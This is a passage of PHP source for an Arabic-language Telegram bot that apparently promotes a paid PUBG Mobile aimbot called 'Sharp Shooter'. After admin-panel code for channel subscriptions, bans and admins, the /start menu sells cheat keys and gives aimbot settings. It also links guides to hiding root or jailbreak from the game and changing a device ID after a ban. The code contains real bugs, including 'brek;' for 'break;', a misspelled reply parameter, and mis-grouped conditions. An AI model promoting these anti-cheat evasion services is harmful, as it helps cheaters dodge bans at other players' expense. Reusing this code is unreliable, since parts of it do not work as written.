['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
				}
				if($data == "ch" or $data == "ch1del" or $data == "ch2del"){
					if($data == "ch1del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 1 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch1']);
						}
						if($data == "ch2del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 2 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch2']);
						}
					if($sting['sting']['ch1'] == null){
						$ch1 = "قناة 1 🔱 لا يوجد 😴";
						}else{
							$ch3 = bot('getchat',['chat_id'=>$sting['sting']['ch1']]);
							if($ch3->ok == true){
								$ch1 = $ch3->result->title;
								}else{
									$ch1 = "قناة 1 🔱 لا يوجد 😴";
									}
							}
							if($sting['sting']['ch2'] == null){
						$ch2 = "قناة 2 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$sting['sting']['ch2']]);
							if($ch->ok == true){
								$ch2 = $ch->result->title;
								}else{
									$ch2 = "قناة 2 🔱 لا يوجد 🌚";
									}
							}
					bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك أوامر الإشتراك الإجباري 😼
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"$ch1",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 👌",'callback_data'=>"ch1add"],['text'=>"حذف قناة 🤟",'callback_data'=>"ch1del"]
],
[
['text'=>"$ch2",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 😼",'callback_data'=>"ch2add"],['text'=>"حذف قناة 🤙",'callback_data'=>"ch2del"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
					}
					if($data == "ch1add" or $data == "ch2add"){
						bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن معرف القناة Ⓜ️ او وجه أي رسالة من القناة 🔄
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"ch"]
]
]])
]);
if($data == "ch1add"){
$sting['sting']['sting'] = "ch1";
}else{
	$sting['sting']['sting'] = "ch2";
	}
	$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
						}
						if(!$data and $sting['sting']['sting'] == 'ch1' or $sting['sting']['sting'] == 'ch2' and $sting['sting']['id'] == $from_id and $update->message->forward_from_chat or preg_match("/(@)(.)/", $text)){
							if($sting['sting']['sting'] == 'ch1' or $sting['sting']['sting'] == 'ch2'){
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ القناة بنجاح ✅
	تأكد أن البوت مشرف في القناة ⁦👮🏻‍♂️⁩
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'ch']
],
]])
]);
if($update->message->forward_from_chat){
	$sting['sting'][$sting['sting']['sting']] = $update->message->forward_from_chat->id;
	}else{
		$sting['sting'][$sting['sting']['sting']] = $text;
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
							}
							}
	if($data == "admins"){
		foreach($sting['sting']['admins'] as $admins){
		$names = bot("getchat",["chat_id"=>$admins])->result->first_name;
		if($names != null){
		$addmins .= "[$names](tg://user?id=$admins)\n";
		}
		}
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تفضل عزيزي الأدمن ⁦👮🏻‍♂️⁩ قائمة الأدمنة 📃
	$addmins
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
		}
		if($data == "chg" or $data == "chg1del" or $data == "chg2del"){
			if($data == "chg1del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 1 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['chg1']);
						}
						if($data == "chg2del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 2 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['chg2']);
						}
					if($sting['sting']['chg1'] == null){
						$chg1 = "قناة 1 🔱 لا يوجد 😴";
						}else{
							$chg3 = bot('getchat',['chat_id'=>$sting['sting']['chg1']]);
							if($chg3->ok == true){
								$chg1 = $chg3->result->title;
								}else{
									$chg1 = "قناة 1 🔱 لا يوجد 😴";
									}
							}
							if($sting['sting']['chg2'] == null){
						$chg2 = "قناة 2 🔱 لا يوجد 🌚";
						}else{
							$chg = bot('getchat',['chat_id'=>$sting['sting']['chg2']]);
							if($chg->ok == true){
								$chg2 = $chg->result->title;
								}else{
									$chg2 = "قناة 2 🔱 لا يوجد 🌚";
									}
							}
					bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك أوامر الإشتراك الإجباري 😼
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"$chg1",'callback_data'=>"chg"]
],
[
['text'=>"وضع قناة 👌",'callback_data'=>"chg1add"],['text'=>"حذف قناة 🤟",'callback_data'=>"chg1del"]
],
[
['text'=>"$chg2",'callback_data'=>"chg"]
],
[
['text'=>"وضع قناة 😼",'callback_data'=>"chg2add"],['text'=>"حذف قناة 🤙",'callback_data'=>"chg2del"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
					}
					if($data == "chg1add" or $data == "chg2add"){
						bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن معرف القناة Ⓜ️ او وجه أي رسالة من القناة 🔄
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"chg"]
]
]])
]);
if($data == "chg1add"){
$sting['sting']['sting'] = "chg1";
}else{
	$sting['sting']['sting'] = "chg2";
	}
	$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
						}
						if(!$data and $sting['sting']['sting'] == 'chg1' or $sting['sting']['sting'] == 'chg2' and $sting['sting']['id'] == $from_id and $update->message->forward_from_chat or preg_match("/(@)(.)/", $text)){
							if($sting['sting']['sting'] == 'chg1' or $sting['sting']['sting'] == 'chg2')
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ القناة بنجاح ✅
	تأكد أن البوت مشرف في القناة ⁦👮🏻‍♂️⁩.
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'chg']
],
]])
]);
if($sting['sting']['sting'] != null){
if($update->message->forward_from_chat){
	$sting['sting'][$sting['sting']['sting']] = $update->message->forward_from_chat->id;
	}else{
		$sting['sting'][$sting['sting']['sting']] = $text;
		}
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
							}
							if($data == "band"){
								$band = count($sting['sting']['band']);
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك أوامر الحظر 🤟
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"المحظورين 📛  «".$band."»",'callback_data'=>"bander"]
],
[
['text'=>"حظر ➕⛔",'callback_data'=>"bandadd"],['text'=>"إلغاء حظر ➖⛔",'callback_data'=>"delband"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
								}
								if($data == "bandadd" or $data == "delband"){
									$a = str_replace(['bandadd','delband'],['لأحظره من البوت 📛','لأزيله من المحظورين 😃'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 الشخص $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"band"]
],
]])
]);
$sting['sting']['sting'] = $data;
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
									}
									if(!$update->callback_query){
						if($text != null and $sting['sting']['sting'] == "bandadd" or $sting['sting']['sting'] == "delband" and $sting['sting']['id'] == $from_id){
							$a = str_replace(['bandadd','delband'],['حظره بنجاح 😏','إلغاء حظره بنجاح 😴'],$sting['sting']['sting']);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم $a
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'band']
],
]])
]);
if($sting['sting']['sting'] == "bandadd"){
	$sting['sting']['band'][] = $text;
	}else{
		foreach($sting['sting']['band'] as $num => $json){
			if($json == $text){
		unset($sting['sting']['band'][$num]);
		brek;
		}
		}
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
							}
							}
							if($data == "bander"){
								foreach($sting['sting']['band'] as $band){
									if($band != null){
									$s .= "`$band` » [للدخول إلى الحساب 🍃](tg://user?id=$band)\n";
									}
}
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك قائمة المحظورين 📛
$s
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"band"]
],
]])
]);
								}
								if($data == "addadmin" or $data == "deladmin"){
									$a = str_replace(['addadmin','deladmin'],['لأرفعه أدمن ⁦☺️⁩','لأزيله من قائمة الأدمنة 😼'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 الشخص $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
],
]])
]);
$sting['sting']['sting'] = $data;
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
									}
									if(!$update->callback_query){
						if($text != null and $sting['sting']['sting'] == "addadmin" or $sting['sting']['sting'] == "deladmin" and $sting['sting']['id'] == $from_id){
							$a = str_replace(['addadmin','deladmin'],['تم رفعه بنجاح 😉','تم تنزيله بنجاح 😏'],$sting['sting']['sting']);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم $a
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
if($sting['sting']['sting'] == "addadmin"){
	$sting['sting']['admins'][] = $text;
	bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	مبارك تم رفعك كمشرف في البوت 🤩
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'القائمة الرئيسية 🏠','callback_data'=>'back']
],
]])
]);
	}else{
		foreach($sting['sting']['admins'] as $num => $json){
			if($json == $text){
		unset($sting['sting']['admins'][$num]);
		bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	تم تنزيلك من الإشراف 😒
	",
]);
		break;
		}
		}
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
							}
							}
		}
if($text=="/start"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔝 القائمة الرئيسية",
  'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"✅ لشراء مفاتيح الشارب شوتر ✅"]], 
[['text'=>"✅ حالة الشارب شوتر الان ✅"]],
[['text'=>"قناة الاخبار والشروحات"]],
[['text'=>"قروب الاندوريد"],['text'=>"قروب الجلبريك"]],
[['text'=>"⚠️ تشغيل ايم بوت 1.1 ⚠️"]],
[['text'=>"✅  افضل اعدادات لحساسيه الكامره  ✅"]],
[['text'=>"🔰 اعدادات حساسيه اجهزة الون بلس 🔰"]],
[['text'=>"اعدادات ايم بوت 1.1"],['text'=>"اعدادات الايم بوت 2.0"]],
[['text'=>"[حل مشكله [ كود1 - error1"],['text'=>"[حل مشكله [ كود2 - error2"]],
[['text'=>"🔻 تثبيت الشارب شوتر على الايفون 🔻"]],
[['text'=>"✅ اعدادات ايم بوت شارب شوتر الايفون ✅"]],
[['text'=>"❕سورسات مهمه للسيديا ❕"]],
[['text'=>"🔰 سورس الشارب شوتر في السيديا 🔰"]],
[['text'=>"🎗تحميل بوبجي بصيغه apk🎗"]],
[['text'=>"✅ شرح تحميل الشارب شوتر  [ اندوريد ] ✅"]],
[['text'=>"♦️شلون تسوي كلين داته للعبه [ جلبريك ]♦️"]],
[['text'=>"☢️ كلين داته للعبة والشارب [ اندوريد ] ☢️"]],
[['text'=>"☣️ حل التعليق والكراش [ اندوريد ] ☣️"]],
[['text'=>"🔹 برامج تنظيف الجهاز [ نظام الاندوريد ] 🔹"]],
[['text'=>"🔸 مشكلة pubg not running 🔸"]],
[['text'=>"✅ طريقه تغيير id الجهاز بعد الباند ✅"]],
[['text'=>"📍 شلون تخفي الروت عن بوبجي 📍"]],
[['text'=>"📱 افضل الاجهزه للعبه بوبجي 📱"]],
[['text'=>"📍 الادمن المسؤل عن القروب📍"]],
[['text'=>"لاضافتنا على سناب شات 👻"]],
]])]);
}
if($text =="✅ لشراء مفاتيح الشارب شوتر ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"لشراء المفاتيح تفضل بزياره الموقع 

https://www.shooterkw.com

او قم بالتواصل مباشر مع المسؤل
والدفع مباشر  < @al3nzy >

نقبل الدفع من جميع دول العالم 
فيزا - كي نت - ماستر كارد - راجحي - مدى 
الدول الي مو متوفر فيها دفع اون لاين نقبل الدفع ببطايق الايتونز والقوقل بلاي  الامريكي

❗️اسعار المفاتيح ❗️

شهري 13 - اسبوعي 7 - يومي 2.500 ‏🇰🇼
شهري 160 - اسبوعي 80 - يومي 30 ‏ ‏🇸🇦
شهري 50$ - اسبوعي 20$ - يومي 10$ 💵

-الايفون لازم يكون عندك جلبريك ⚠️
-الاندوريد لازم يكون عندك روت ⚠️

تواصل معي > @al3nzy

📍فيديو لطريقة الشراء من موقعنا 📍
https://t.me/Shooterkwinfo/608",
]);
}

if($text =="✅ حالة الشارب شوتر الان ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"من هنا تعرف حاله وامان الشارب شوتر 

https://cheatninja.com/status/",
]);
}
if($text =="قناة الاخبار والشروحات"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"قناة الاخبار والشروحات
https://t.me/Shooterkwinfo",
]);
}
if($text =="قروب الاندوريد"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"‎قروب الاندوريد والروت ~
https://t.me/Shooterkw",
]);
}
if($text =="قروب الجلبريك"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"‎قروب الايفون و الجلبريك ~ 
https://t.me/Shooterkwios",
]);
}
if($text =="⚠️ تشغيل ايم بوت 1.1 ⚠️"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"https://t.me/Shooterkwinfo/506",
]);
}
if($text =="✅  افضل اعدادات لحساسيه الكامره  ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"✅  افضل اعدادات لحساسيه الكامره  ✅

https://t.me/Shooterkwinfo/1357",
]);
}

if($text =="🔰 اعدادات حساسيه اجهزة الون بلس 🔰"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"افضل اعدادات لحساسيه اجهزه الون بلس 

https://t.me/Shooterkwinfo/1303",
]);
}
if($text =="اعدادات ايم بوت 1.1"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"اعدادات شارب شوتر ايم بوت  1.1 

- التصويب زر تحريك (خلها مقفله )
- الجسم جزء على التصويب ( صدر )
- وضع اختيار العدو ( الاقرب الى الشاشه ) 
- وضع تشغيل الايم بوت ( عندما تهدف سلاح او اطلاق النار )
- الثبات التصويب ( خلها مفعله ) 
- تجاهل اللاعبين ( فعلها ) 
- الشاشه على الرويه ( خلها مقفله ) 
- التلقائي التصويب ( خلها 40 )
- المتقدم التصويب ( فعلها ) 
- سرعة الرصاصة ( 600 ) 
- تعويض الارتداد ( 3.6 )


⚠️ ايمبوت 1.1 خطير واستخدامه على مسؤوليتك",
]);
}
if($text =="اعدادات الايم بوت 2.0"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"ضبط اعدادات الايمبوت 2.0

https://t.me/Shooterkwinfo/609",
]);
}
if($text =="[حل مشكله [ كود2 - error2"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"أسباب خطاء 2 / كود2 / ايررور2⚠️

أستعامل VPN

طفا جهاز شحن والشارب شغال

نقل اشتراك الشارب الى جهاز جديد

عدم استعمال الشارب اكثر من يومين

في حال حدثت الشارب يعطيك كود2

------------الحل✅ -----------

أنتظر من ساعتين الى 4 ساعات فقط",
]);
}
if($text =="[حل مشكله [ كود1 - error1"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"أسباب خطاء 1 / كود1 / ايررور1⚠️


1- اما يكون منتهي اشتراكك 

2- او انك ناسخ ولاصقه بالبرنامج 
( مايصير تنسخه )

3- او كاتبه غلط - 
لان يجي احرف كبيره وصغيره

او جرب عدل التاريخ والوقت 
https://t.me/Shooterkwinfo/538",
]);
}
if($text =="🔻 تثبيت الشارب شوتر على الايفون 🔻"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"من هنا تعرف حاله وامان الشارب شوتر 

https://cheatninja.com/status/",
]);
}
if($text =="✅ اعدادات ايم بوت شارب شوتر الايفون ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"اعدادات ايم بوت شارب شوتر الايفون 

https://t.me/Shooterkwinfo/977",
]);
}
if($text =="❕سورسات مهمه للسيديا ❕"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"سورس الشارب شوتر 
https://gmspack404.github.io

سورس متجر زيبرا ( zebra )
https://getzbra.com/repo/


📍 اهم ادوات السيديا مع السورس الخاص 📍

🏷 - Apps Manager
https://tigisoftware.com/cydia/

🏷 - Filza File Manager ( فيلزا )
https://tigisoftware.com/cydia/

🏷 - iCleaner
https://ib-soft.net/cydia/beta/


📍 أفضل ادوات اخفاء جيلبريك 📍


سورس اداة الإخفاء ( choicy )
https://opa334.github.io/

🏷 -  FlyJB 
https://gmspack.yourepo.com

🏷 -  Tweaks Manger 
https://repo.packix.com

🏷 - HideJb 
https://repo.thuthuatjb.com

🏷 - A-Baypass
https://repo.co.kr",
]);
}
if($text =="🔰 سورس الشارب شوتر في السيديا 🔰"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"سورس الشارب شوتر 
https://gmspack404.github.io",
]);
}
if($text =="🎗تحميل بوبجي بصيغه apk🎗"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"🎗تحميل بوبجي بصيغه apk🎗

https://t.me/Shooterkwinfo/1386",
]);
}
if($text =="✅ شرح تحميل الشارب شوتر  [ اندوريد ] ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"✅ شرح تحميل الشارب شوتر  [ اندوريد ] ✅
https://t.me/Shooterkwinfo/1587",
]);
}
if($text =="♦️شلون تسوي كلين داته للعبه [ جلبريك ]♦️"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"شلون تسوي كلين داته للعبه بالجلبريك

https://t.me/Shooterkwinfo/159",
]);
}
if($text =="☢️ كلين داته للعبة والشارب [ اندوريد ] ☢️"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"شلون تسوي كلين داته للعبه وللشارب 

https://t.me/Shooterkwinfo/310",
]);
}
if($text =="☣️ حل التعليق والكراش [ اندوريد ] ☣️"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"حل مشكله التعليق والكراش للعبة 
https://t.me/Shooterkwinfo/311",
]);
}
if($text =="🔹 برامج تنظيف الجهاز [ نظام الاندوريد ] 🔹"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"تنظيف الجهاز ( اندوريد )

https://t.me/Shooterkwinfo/1579",
]);
}
if($text =="🔸 مشكلة pubg not running 🔸"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"حل مشكلة pubg not running

اول شي تسوي تسجيل خروج من الشارب 

بعدها تطبق الشرح 

https://t.me/Shooterkwinfo/312",
]);
}
if($text =="✅ طريقه تغيير id الجهاز بعد الباند ✅"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"✅ طريقه تغيير id الجهاز بعد الباند ✅

https://t.me/Shooterkwinfo/345",
]);
}
if($text =="📍 شلون تخفي الروت عن بوبجي 📍"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"طريقة اخفاء الروت عن بوبجي 

https://t.me/Shooterkwinfo/986",
]);
}
if($text =="📱 افضل الاجهزه للعبه بوبجي 📱"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"أفضل الأجهزة للعبة ويركب عليها روت

https://t.me/Shooterkwinfo/4",
]);
}
if($text =="📍 الادمن المسؤل عن القروب📍"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"@AL3NZY",
]);
}
if($text =="لاضافتنا على سناب شات 👻"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"على سناب شات يتم نشر التحديثات الحصرية وحلول مشاكل الشارب شوتر من المطورين وقبل الجميع كن متواجد 👍

• رابط مباشر للاضافه •
www.snapchat.com/add/s_aaw",
]);
}